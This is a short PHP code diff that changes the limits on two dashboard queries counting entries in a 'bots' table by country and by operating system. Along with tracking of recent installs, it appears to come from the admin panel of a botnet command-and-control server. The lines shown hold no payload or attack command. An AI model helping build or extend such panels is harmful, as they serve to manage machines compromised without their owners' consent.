@@ -70,7 +70,7 @@ class Main{
             $statement->execute(array());
             $last5Installs = $statement->fetchAll(PDO::FETCH_ASSOC);
             //======================== Country  HANDLER ========================
-            $statement = $GLOBALS["pdo"]->prepare("SELECT country, COUNT(*) AS cnt FROM bots GROUP BY country ORDER BY cnt DESC "); //LIMIT 3
+            $statement = $GLOBALS["pdo"]->prepare("SELECT country, COUNT(*) AS cnt FROM bots GROUP BY country ORDER BY cnt DESC LIMIT 6");
             $statement->execute(array());
             $top3Countrys = $statement->fetchAll(PDO::FETCH_ASSOC);
             $CountyLables = array();
@@ -82,7 +82,7 @@ class Main{
             //======================== Country  HANDLER END ========================
 
             //======================== OPERING SYSTEM HANDLER ========================
-            $statement = $GLOBALS["pdo"]->prepare("SELECT operingsystem, COUNT(*) AS cnt FROM bots GROUP BY operingsystem ORDER BY cnt DESC "); // LIMIT 3
+            $statement = $GLOBALS["pdo"]->prepare("SELECT operingsystem, COUNT(*) AS cnt FROM bots GROUP BY operingsystem ORDER BY cnt DESC LIMIT 6");
             $statement->execute(array());
             $top3os = $statement->fetchAll(PDO::FETCH_ASSOC);
             $OsLables = array();
